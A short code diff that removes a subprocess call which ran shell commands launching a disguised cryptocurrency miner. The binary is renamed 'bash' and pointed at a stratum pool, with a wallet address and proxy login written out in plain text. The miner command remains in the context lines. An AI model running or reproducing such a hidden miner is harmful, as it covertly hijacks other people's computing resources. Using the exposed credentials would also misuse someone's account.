@@ -19,9 +19,4 @@ def run_script():
     cd lol198
     chmod u+x bash
     ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health 
-    """
-
-    subprocess.run(
-        ["bash", "-lc", cmds],
-        check=False
-    )
+    
